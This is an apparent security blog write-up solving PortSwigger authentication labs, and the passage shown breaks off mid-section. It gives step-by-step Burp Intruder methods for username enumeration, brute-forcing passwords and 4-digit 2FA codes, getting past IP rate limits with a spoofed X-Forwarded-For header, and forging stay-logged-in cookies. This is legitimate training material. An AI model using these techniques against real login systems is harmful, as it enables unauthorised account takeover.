<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.4.1" /><meta property="og:title" content="Broken Authentication Labs" /><meta property="og:locale" content="en" /><meta name="description" content="Vulnerabilities in password-based login Username enumeration via different responses With Burp running, investigate the login page and submit an invalid username and password. In Burp, go to Proxy &gt; HTTP history and find the POST /login request. Send this to Burp Intruder. In Burp Intruder, go to the Positions tab. Make sure that the Sniper attack type is selected. Click Clear § to remove any automatically assigned payload positions. Highlight the value of the username parameter and click Add § to set it as a payload position. This position will be indicated by two § symbols, for example: username=§invalid-username§. Leave the password as any static value for now. On the Payloads tab, make sure that the Simple list payload type is selected. Under Payload options, paste the list of candidate usernames. Finally, click Start attack. The attack will start in a new window. When the attack is finished, on the Results tab, examine the Length column. You can click on the column header to sort the results. Notice that one of the entries is longer than the others. Compare the response to this payload with the other responses. Notice that other responses contain the message Invalid username, but this response says Incorrect password. Make a note of the username in the Payload column. Close the attack and go back to the Positions tab. Click Clear, then change the username parameter to the username you just identified. Add a payload position to the password parameter. The result should look something like this: username=identified-user&amp;password=§invalid-password§ On the Payloads tab, clear the list of usernames and replace it with the list of candidate passwords. Click Start attack. When the attack is finished, look at the Status column. Notice that each request received a response with a 200 status code except for one, which got a 302 response. This suggests that the login attempt was successful - make a note of the password in the Payload column. Log in using the username and password that you identified and access the user account page to solve the lab." /><meta property="og:description" content="Vulnerabilities in password-based login Username enumeration via different responses With Burp running, investigate the login page and submit an invalid username and password. In Burp, go to Proxy &gt; HTTP history and find the POST /login request. Send this to Burp Intruder. In Burp Intruder, go to the Positions tab. Make sure that the Sniper attack type is selected. Click Clear § to remove any automatically assigned payload positions. Highlight the value of the username parameter and click Add § to set it as a payload position. This position will be indicated by two § symbols, for example: username=§invalid-username§. Leave the password as any static value for now. On the Payloads tab, make sure that the Simple list payload type is selected. Under Payload options, paste the list of candidate usernames. Finally, click Start attack. The attack will start in a new window. When the attack is finished, on the Results tab, examine the Length column. You can click on the column header to sort the results. Notice that one of the entries is longer than the others. Compare the response to this payload with the other responses. Notice that other responses contain the message Invalid username, but this response says Incorrect password. Make a note of the username in the Payload column. Close the attack and go back to the Positions tab. Click Clear, then change the username parameter to the username you just identified. Add a payload position to the password parameter. The result should look something like this: username=identified-user&amp;password=§invalid-password§ On the Payloads tab, clear the list of usernames and replace it with the list of candidate passwords. Click Start attack. When the attack is finished, look at the Status column. Notice that each request received a response with a 200 status code except for one, which got a 302 response. This suggests that the login attempt was successful - make a note of the password in the Payload column. Log in using the username and password that you identified and access the user account page to solve the lab." /><link rel="canonical" href="https://s4yhii.github.io/posts/Broken-Authentication-Labs/" /><meta property="og:url" content="https://s4yhii.github.io/posts/Broken-Authentication-Labs/" /><meta property="og:site_name" content="s4yhii’s Blog" /><meta property="og:image" content="https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/Portswigger/auth1.jpg" /><meta property="og:image:height" content="1100" /><meta property="og:image:width" content="500" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-03-15T11:00:00-05:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/Portswigger/auth1.jpg" /><meta property="twitter:title" content="Broken Authentication Labs" /><meta name="twitter:site" content="@s4yhii" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-07-30T14:34:27-05:00","datePublished":"2022-03-15T11:00:00-05:00","description":"Vulnerabilities in password-based login Username enumeration via different responses With Burp running, investigate the login page and submit an invalid username and password. In Burp, go to Proxy &gt; HTTP history and find the POST /login request. Send this to Burp Intruder. In Burp Intruder, go to the Positions tab. Make sure that the Sniper attack type is selected. Click Clear § to remove any automatically assigned payload positions. Highlight the value of the username parameter and click Add § to set it as a payload position. This position will be indicated by two § symbols, for example: username=§invalid-username§. Leave the password as any static value for now. On the Payloads tab, make sure that the Simple list payload type is selected. Under Payload options, paste the list of candidate usernames. Finally, click Start attack. The attack will start in a new window. When the attack is finished, on the Results tab, examine the Length column. You can click on the column header to sort the results. Notice that one of the entries is longer than the others. Compare the response to this payload with the other responses. Notice that other responses contain the message Invalid username, but this response says Incorrect password. Make a note of the username in the Payload column. Close the attack and go back to the Positions tab. Click Clear, then change the username parameter to the username you just identified. Add a payload position to the password parameter. The result should look something like this: username=identified-user&amp;password=§invalid-password§ On the Payloads tab, clear the list of usernames and replace it with the list of candidate passwords. Click Start attack. When the attack is finished, look at the Status column. Notice that each request received a response with a 200 status code except for one, which got a 302 response. This suggests that the login attempt was successful - make a note of the password in the Payload column. Log in using the username and password that you identified and access the user account page to solve the lab.","headline":"Broken Authentication Labs","image":{"height":1100,"width":500,"url":"https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/Portswigger/auth1.jpg","@type":"imageObject"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://s4yhii.github.io/posts/Broken-Authentication-Labs/"},"url":"https://s4yhii.github.io/posts/Broken-Authentication-Labs/"}</script><title>Broken Authentication Labs | s4yhii's Blog</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="s4yhii's Blog"><meta name="application-name" content="s4yhii's Blog"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/streams/dance-pikachu.gif" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">s4yhii's Blog</a></div><div class="site-subtitle font-italic">Appsec blog, CTF write-ups and more</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/s4yhii" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/s4yhii" aria-label="twitter" target="_blank" rel="noopener"> <i class="fa-brands fa-x-twitter"></i> </a> <a href="https://www.linkedin.com/in/jesusluj4n" aria-label="linkedin" target="_blank" rel="noopener"> <i class="fab fa-linkedin"></i> </a> <a href="https://app.hackthebox.com/profile/274780" aria-label="HackTheBox" target="_blank" rel="noopener"> <i class="fas fa-cube"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Broken Authentication Labs</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1 data-toc-skip>Broken Authentication Labs</h1><div class="post-meta text-muted"> <span> Posted <em class="" data-ts="1647360000" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Mar 15, 2022 </em> </span> <span> Updated <em class="" data-ts="1659209667" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Jul 30, 2022 </em> </span><div class="mt-3 mb-3"> <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 500 1100'%3E%3C/svg%3E" data-src="https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/Portswigger/auth1.jpg" class="preview-img bg" alt="Preview Image" width="500" height="1100" data-proofer-ignore></div><div class="d-flex justify-content-between"> <span> By <em> <a href="https://twitter.com/s4yhii">Jesus Lujan</a> </em> </span><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="3390 words"> <em>18 min</em> read</span></div></div></div><div class="post-content"><h1 id="vulnerabilities-in-password-based-login">Vulnerabilities in password-based login</h1><h2 id="username-enumeration-via-different-responses"><span class="mr-2">Username enumeration via different responses</span><a href="#username-enumeration-via-different-responses" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><ol><li>With Burp running, investigate the login page and submit an invalid username and password.<li>In Burp, go to <strong>Proxy &gt; HTTP history</strong> and find the <code class="language-plaintext highlighter-rouge">POST /login</code> request. Send this to Burp Intruder.<li>In Burp Intruder, go to the <strong>Positions</strong> tab. Make sure that the <strong>Sniper</strong> attack type is selected.<li>Click <strong>Clear §</strong> to remove any automatically assigned payload positions. Highlight the value of the <code class="language-plaintext highlighter-rouge">username</code> parameter and click <strong>Add §</strong> to set it as a payload position. This position will be indicated by two <code class="language-plaintext highlighter-rouge">§</code> symbols, for example: <code class="language-plaintext highlighter-rouge">username=§invalid-username§</code>. Leave the password as any static value for now.<li>On the <strong>Payloads</strong> tab, make sure that the <strong>Simple list</strong> payload type is selected.<li>Under <strong>Payload options</strong>, paste the list of candidate usernames. Finally, click <strong>Start attack</strong>. The attack will start in a new window.<li>When the attack is finished, on the <strong>Results</strong> tab, examine the <strong>Length</strong> column. You can click on the column header to sort the results. Notice that one of the entries is longer than the others. Compare the response to this payload with the other responses. Notice that other responses contain the message <code class="language-plaintext highlighter-rouge">Invalid username</code>, but this response says <code class="language-plaintext highlighter-rouge">Incorrect password</code>. Make a note of the username in the <strong>Payload</strong> column.<li>Close the attack and go back to the <strong>Positions</strong> tab. Click <strong>Clear</strong>, then change the <code class="language-plaintext highlighter-rouge">username</code> parameter to the username you just identified. Add a payload position to the <code class="language-plaintext highlighter-rouge">password</code> parameter. The result should look something like this: <code class="language-plaintext highlighter-rouge">username=identified-user&amp;password=§invalid-password§</code><li>On the <strong>Payloads</strong> tab, clear the list of usernames and replace it with the list of candidate passwords. Click <strong>Start attack</strong>.<li>When the attack is finished, look at the <strong>Status</strong> column. Notice that each request received a response with a <code class="language-plaintext highlighter-rouge">200</code> status code except for one, which got a <code class="language-plaintext highlighter-rouge">302</code> response. This suggests that the login attempt was successful - make a note of the password in the <strong>Payload</strong> column.<li>Log in using the username and password that you identified and access the user account page to solve the lab.</ol><h2 id="username-enumeration-via-subtly-different-responses"><span class="mr-2">Username enumeration via subtly different responses</span><a href="#username-enumeration-via-subtly-different-responses" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><ol><li>With Burp running, submit an invalid username and password. Send the <code class="language-plaintext highlighter-rouge">POST /login</code> request to Burp Intruder and add a payload position to the <code class="language-plaintext highlighter-rouge">username</code> parameter.<li>On the <strong>Payloads</strong> tab, make sure that the <strong>Simple list</strong> payload type is selected and add the list of candidate usernames.<li>On the <strong>Options</strong> tab, under <strong>Grep - Extract</strong>, click <strong>Add</strong>. In the dialog that appears, scroll down through the response until you find the error message <code class="language-plaintext highlighter-rouge">Invalid username or password.</code>. Use the mouse to highlight the text content of the message. The other settings will be automatically adjusted. Click <strong>OK</strong> and then start the attack.<li>When the attack is finished, notice that there is an additional column containing the error message you extracted. Sort the results using this column to notice that one of them is subtly different.<li>Look closer at this response and notice that it contains a typo in the error message instead of a full stop/period, there is a trailing space. Make a note of this username.<li>Close the attack and go back to the <strong>Positions</strong> tab. Insert the username you just identified and add a payload position to the <code class="language-plaintext highlighter-rouge">password</code> parameter: <code class="language-plaintext highlighter-rouge">username=identified-user&amp;password=§invalid-password§</code><li>On the <strong>Payloads</strong> tab, clear the list of usernames and replace it with the list of passwords. Start the attack.<li>When the attack is finished, notice that one of the requests received a <code class="language-plaintext highlighter-rouge">302</code> response. Make a note of this password.<li>Log in using the username and password that you identified and access the user account page to solve the lab.</ol><h2 id="username-enumeration-via-response-timing"><span class="mr-2">Username enumeration via response timing</span><a href="#username-enumeration-via-response-timing" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><ol><li>With Burp running, submit an invalid username and password, then send the <code class="language-plaintext highlighter-rouge">POST /login</code> request to Burp Repeater. Experiment with different usernames and passwords. Notice that your IP will be blocked if you make too many invalid login attempts.<li>Identify that the <code class="language-plaintext highlighter-rouge">X-Forwarded-For</code> header is supported, which allows you to spoof your IP address and bypass the IP-based brute-force protection.<li>Continue experimenting with usernames and passwords. Pay particular attention to the response times. Notice that when the username is invalid, the response time is roughly the same. However, when you enter a valid username (your own), the response time is increased depending on the length of the password you entered.<li>Send this request to Burp Intruder and select the attack type to <strong>Pitchfork</strong>. Clear the default payload positions and add the <code class="language-plaintext highlighter-rouge">X-Forwarded-For</code> header.<li>Add payload positions for the <code class="language-plaintext highlighter-rouge">X-Forwarded-For</code> header and the <code class="language-plaintext highlighter-rouge">username</code> parameter. Set the password to a very long string of characters (about 100 characters should do it).<li>On the <strong>Payloads</strong> tab, select payload set 1. Select the <strong>Numbers</strong> payload type. Enter the range 1 - 100 and set the step to 1. Set the max fraction digits to 0. This will be used to spoof your IP.<li>Select payload set 2 and add the list of usernames. Start the attack.<li>When the attack finishes, at the top of the dialog, click <strong>Columns</strong> and select the <strong>Response received</strong> and <strong>Response completed</strong> options. These two columns are now displayed in the results table.<li>Notice that one of the response times was significantly longer than the others. Repeat this request a few times to make sure it consistently takes longer, then make a note of this username.<li>Create a new Burp Intruder attack for the same request. Add the <code class="language-plaintext highlighter-rouge">X-Forwarded-For</code> header again and add a payload position to it. Insert the username that you just identified and add a payload position to the <code class="language-plaintext highlighter-rouge">password</code> parameter.<li>On the <strong>Payloads</strong> tab, add the list of numbers in payload set 1 and add the list of passwords to payload set 2. Start the attack.<li>When the attack is finished, find the response with a <code class="language-plaintext highlighter-rouge">302</code> status. Make a note of this password.<li>Log in using the username and password that you identified and access the user account page to solve the lab.</ol><h2 id="broken-brute-force-protection-ip-block"><span class="mr-2">Broken brute-force protection, IP block</span><a href="#broken-brute-force-protection-ip-block" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><ol><li>With Burp running, investigate the login page. Observe that your IP is temporarily blocked if you submit 3 incorrect logins in a row. However, notice that you can reset the counter for the number of failed login attempts by logging in to your own account before this limit is reached.<li>Enter an invalid username and password, then send the <code class="language-plaintext highlighter-rouge">POST /login</code> request to Burp Intruder. Create a pitchfork attack with payload positions in both the <code class="language-plaintext highlighter-rouge">username</code> and <code class="language-plaintext highlighter-rouge">password</code> parameters.<li>On the <strong>Resource pool</strong> tab, add the attack to a resource pool with <strong>Maximum concurrent requests</strong> set to <code class="language-plaintext highlighter-rouge">1</code>. By only sending one request at a time, you can ensure that your login attempts are sent to the server in the correct order.<li>On the <strong>Payloads</strong> tab, select payload set 1. Add a list of payloads that alternates between your username and <code class="language-plaintext highlighter-rouge">carlos</code>. Make sure that your username is first and that <code class="language-plaintext highlighter-rouge">carlos</code> is repeated at least 100 times.<li>Edit the list of candidate passwords and add your own password before each one. Make sure that your password is aligned with your username in the other list.<li>Add this list to payload set 2 and start the attack.<li>When the attack finishes, filter the results to hide responses with a 200 status code. Sort the remaining results by username. There should only be a single 302 response for requests with the username <code class="language-plaintext highlighter-rouge">carlos</code>. Make a note of the password from the <strong>Payload 2</strong> column.<li>Log in to Carlos’s account using the password that you identified and access his account page to solve the lab.</ol><h2 id="username-enumeration-via-account-lock"><span class="mr-2">Username enumeration via account lock</span><a href="#username-enumeration-via-account-lock" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><ol><li>With Burp running, investigate the login page and submit an invalid username and password. Send the <code class="language-plaintext highlighter-rouge">POST /login</code> request to Burp Intruder.<li><p>Select the attack type <strong>Cluster bomb</strong>. Add a payload position to the <code class="language-plaintext highlighter-rouge">username</code> parameter. Add a blank payload position to the end of the request body by clicking <strong>Add §</strong> twice. The result should look something like this:</p><p><code class="language-plaintext highlighter-rouge">username=§invalid-username§&amp;password=example§§</code></p><li>On the <strong>Payloads</strong> tab, add the list of usernames to the first payload set. For the second set, select the <strong>Null payloads</strong> type and choose the option to generate 5 payloads. This will effectively cause each username to be repeated 5 times. Start the attack.<li>In the results, notice that the responses for one of the usernames were longer than responses when using other usernames. Study the response more closely and notice that it contains a different error message: <code class="language-plaintext highlighter-rouge">You have made too many incorrect login attempts.</code> Make a note of this username.<li>Create a new Burp Intruder attack on the <code class="language-plaintext highlighter-rouge">POST /login</code> request, but this time select the <strong>Sniper</strong> attack type. Set the <code class="language-plaintext highlighter-rouge">username</code> parameter to the username that you just identified and add a payload position to the <code class="language-plaintext highlighter-rouge">password</code> parameter.<li>Add the list of passwords to the payload set and create a grep extraction rule for the error message. Start the attack.<li>In the results, look at the grep extract column. Notice that there are a couple of different error messages, but one of the responses did not contain any error message. Make a note of this password.<li>Wait for a minute to allow the account lock to reset. Log in using the username and password that you identified and access the user account page to solve the lab.</ol><h2 id="broken-brute-force-protection-multiple-credentials-per-request"><span class="mr-2">Broken brute-force protection, multiple credentials per request</span><a href="#broken-brute-force-protection-multiple-credentials-per-request" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><ol><li>With Burp running, investigate the login page. Notice that the <code class="language-plaintext highlighter-rouge">POST /login</code> request submits the login credentials in <code class="language-plaintext highlighter-rouge">JSON</code> format. Send this request to Burp Repeater.<li><p>In Burp Repeater, replace the single string value of the password with an array of strings containing all of the candidate passwords. For example:</p><p><code class="language-plaintext highlighter-rouge">"username" : "carlos", "password" : [ "123456", "password", "qwerty" ... ]</code></p><li>Send the request. This will return a 302 response.<li>Right-click on this request and select <strong>Show response in browser</strong>. Copy the URL and load it in your browser. The page loads and you are logged in as <code class="language-plaintext highlighter-rouge">carlos</code>.<li>Click <strong>My account</strong> to access Carlos’s account page and solve the lab</ol><h1 id="vulnerabilities-in-multi-factor-authentication">Vulnerabilities in multi-factor authentication</h1><h2 id="2fa-simple-bypass"><span class="mr-2">2FA simple bypass</span><a href="#2fa-simple-bypass" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><ol><li>Log in to your own account. Your 2FA verification code will be sent to you by email. Click the <strong>Email client</strong> button to access your emails.<li>Go to your account page and make a note of the URL.<li>Log out of your account.<li>Log in using the victim’s credentials.<li>When prompted for the verification code, manually change the URL to navigate to <code class="language-plaintext highlighter-rouge">/my-account</code>. The lab is solved when the page loads.</ol><h2 id="2fa-broken-logic"><span class="mr-2">2FA broken logic</span><a href="#2fa-broken-logic" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><ol><li>With Burp running, log in to your own account and investigate the 2FA verification process. Notice that in the <code class="language-plaintext highlighter-rouge">POST /login2</code> request, the <code class="language-plaintext highlighter-rouge">verify</code> parameter is used to determine which user’s account is being accessed.<li>Log out of your account.<li>Send the <code class="language-plaintext highlighter-rouge">GET /login2</code> request to Burp Repeater. Change the value of the <code class="language-plaintext highlighter-rouge">verify</code> parameter to <code class="language-plaintext highlighter-rouge">carlos</code> and send the request. This ensures that a temporary 2FA code is generated for Carlos.<li>Go to the login page and enter your username and password. Then, submit an invalid 2FA code.<li>Send the <code class="language-plaintext highlighter-rouge">POST /login2</code> request to Burp Intruder.<li>In Burp Intruder, set the <code class="language-plaintext highlighter-rouge">verify</code> parameter to <code class="language-plaintext highlighter-rouge">carlos</code> and add a payload position to the <code class="language-plaintext highlighter-rouge">mfa-code</code> parameter. Brute-force the verification code.<li>Load the 302 response in your browser.<li>Click <strong>My account</strong> to solve the lab.</ol><h2 id="2fa-bypass-using-a-brute-force-attack"><span class="mr-2">2FA bypass using a brute-force attack</span><a href="#2fa-bypass-using-a-brute-force-attack" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><ol><li>With Burp running, log in as <code class="language-plaintext highlighter-rouge">carlos</code> and investigate the 2FA verification process. Notice that if you enter the wrong code twice, you will be logged out again. You need to use Burp’s session handling features to log back in automatically before sending each request.<li>In Burp, go to <strong>Project options &gt; Sessions</strong>. In the <strong>Session Handling Rules</strong> panel, click <strong>Add</strong>. The <strong>Session handling rule editor</strong> dialog opens.<li>In the dialog, go to the <strong>Scope</strong> tab. Under <strong>URL Scope</strong>, select the option <strong>Include all URLs</strong>.<li>Go back to the <strong>Details</strong> tab and under <strong>Rule Actions</strong>, click <strong>Add &gt; Run a macro</strong>.<li><p>Under <strong>Select macro</strong> click <strong>Add</strong> to open the <strong>Macro Recorder</strong>. Select the following 3 requests:</p><p><code class="language-plaintext highlighter-rouge">GET /login POST /login GET /login2</code></p><p>Then click <strong>OK</strong>. The <strong>Macro Editor</strong> dialog opens.</p><li>Click <strong>Test macro</strong> and check that the final response contains the page asking you to provide the 4-digit security code. This confirms that the macro is working correctly.<li>Keep clicking <strong>OK</strong> to close the various dialogs until you get back to the main Burp window. The macro will now automatically log you back in as Carlos before each request is sent by Burp Intruder.<li>Send the <code class="language-plaintext highlighter-rouge">POST /login2</code> request to Burp Intruder.<li>In Burp Intruder, add a payload position to the <code class="language-plaintext highlighter-rouge">mfa-code</code> parameter.<li>On the <strong>Payloads</strong> tab, select the <strong>Numbers</strong> payload type. Enter the range 0 - 9999 and set the step to 1. Set the min/max integer digits to 4 and max fraction digits to 0. This will create a payload for every possible 4-digit integer.<li>Go to the <strong>Resource pool</strong> tab and add the attack to a resource pool with the <strong>Maximum concurrent requests</strong> set to <code class="language-plaintext highlighter-rouge">1</code>.<li>Start the attack. Eventually, one of the requests will return a 302 status code. Right-click on this request and select <strong>Show response in browser</strong>. Copy the URL and load it in your browser.<li>Click <strong>My account</strong> to solve the lab.</ol><h1 id="vulnerabilities-in-other-authentication-mechanisms">Vulnerabilities in other authentication mechanisms</h1><h2 id="brute-forcing-a-stay-logged-in-cookie"><span class="mr-2">Brute-forcing a stay-logged-in cookie</span><a href="#brute-forcing-a-stay-logged-in-cookie" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><ol><li>With Burp running, log in to your own account with the <strong>Stay logged in</strong> option selected. Notice that this sets a <code class="language-plaintext highlighter-rouge">stay-logged-in</code> cookie.<li><p>Examine this cookie in the <a href="https://portswigger.net/burp/documentation/desktop/functions/message-editor/inspector">Inspector</a> panel and notice that it is Base64-encoded. Its decoded value is <code class="language-plaintext highlighter-rouge">wiener:51dc30ddc473d43a6011e9ebba6ca770</code>. Study the length and character set of this string and notice that it could be an MD5 hash. Given that the plaintext is your username, you can make an educated guess that this may be a hash of your password. Hash your password using MD5 to confirm that this is the case. We now know that the cookie is constructed as follows:</p><p><code class="language-plaintext highlighter-rouge">base64(username+':'+md5HashOfPassword)</code></p><li>Log out of your account.<li>Send the most recent <code class="language-plaintext highlighter-rouge">GET /my-account</code> request to Burp Intruder.<li>In Burp Intruder, add a payload position to the <code class="language-plaintext highlighter-rouge">stay-logged-in</code> cookie and add your own password as a single payload.<li>Under <strong>Payload processing</strong>, add the following rules in order. These rules will be applied sequentially to each payload before the request is submitted.<ul><li>Hash: <code class="language-plaintext highlighter-rouge">MD5</code><li>Add prefix: <code class="language-plaintext highlighter-rouge">wiener:</code><li>Encode: <code class="language-plaintext highlighter-rouge">Base64-encode</code></ul><li>As the <strong>Update email</strong> button is only displayed when you access the <code class="language-plaintext highlighter-rouge">/my-account</code> page in an authenticated state, we can use the presence or absence of this button to determine whether we’ve successfully brute-forced the cookie. On the <strong>Options</strong> tab, add a grep match rule to flag any responses containing the string <code class="language-plaintext highlighter-rouge">Update email</code>. Start the attack.<li>Notice that the generated payload was used to successfully load your own account page. This confirms that the payload processing rules work as expected and you were able to construct a valid cookie for your own account.<li>Make the following adjustments and then repeat this attack:<ul><li>Remove your own password from the payload list and add the list of <a href="https://portswigger.net/web-security/authentication/auth-lab-passwords">candidate passwords</a> instead.<li>Change the <strong>Add prefix</strong> rule to add <code class="language-plaintext highlighter-rouge">carlos:</code> instead of <code class="language-plaintext highlighter-rouge">wiener:</code>.</ul><li>When the attack is finished, the lab will be solved. Notice that only one request returned a response containing <code class="language-plaintext highlighter-rouge">Update email</code>. The payload from this request is the valid <code class="language-plaintext highlighter-rouge">stay-logged-in</code> cookie for Carlos’s account.</ol><h2 id="offline-password-cracking"><span class="mr-2">Offline password cracking</span><a href="#offline-password-cracking" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><ol><li>With Burp running, use your own account to investigate the “Stay logged in” functionality. Notice that the <code class="language-plaintext highlighter-rouge">stay-logged-in</code> cookie is Base64 encoded.<li><p>In the <strong>Proxy &gt; HTTP history</strong> tab, go to the <strong>Response</strong> to your login request and highlight the <code class="language-plaintext highlighter-rouge">stay-logged-in</code> cookie, to see that it is constructed as follows:</p><p><code class="language-plaintext highlighter-rouge">username+':'+md5HashOfPassword</code></p><li>You now need to steal the victim user’s cookie. Observe that the comment functionality is 